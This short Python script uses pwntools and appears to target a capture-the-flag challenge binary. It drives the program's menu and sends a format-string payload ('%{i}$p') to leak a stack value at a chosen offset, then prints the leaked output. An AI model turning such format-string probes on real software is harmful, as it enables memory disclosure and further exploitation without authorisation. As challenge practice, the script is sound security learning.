from pwn import *

elf = context.binary = ELF('./chal')
context.terminal = ['alacritty', '-e', 'sh', '-c']
pty = process.PTY

for i in range(9, 10):
    try:
        p = process('./chal2', level='error', stdin=pty, stdout=pty)
       
        p.sendlineafter(b'===', b'1')
        p.sendlineafter(b'===', b'1')
        p.sendlineafter(b'===', f'%{i}$p'.encode())
        p.recv()
        p.recvline()
        p.recvline()
        p.recvline()
        p.recvline()
        p.recvline()
        p.recvline()

        result = p.recvline().decode()

        if result:
            print(str(i) + ': ' + str(result).strip()[:14])
        
        p.close()
    
    except EOFError:
        pass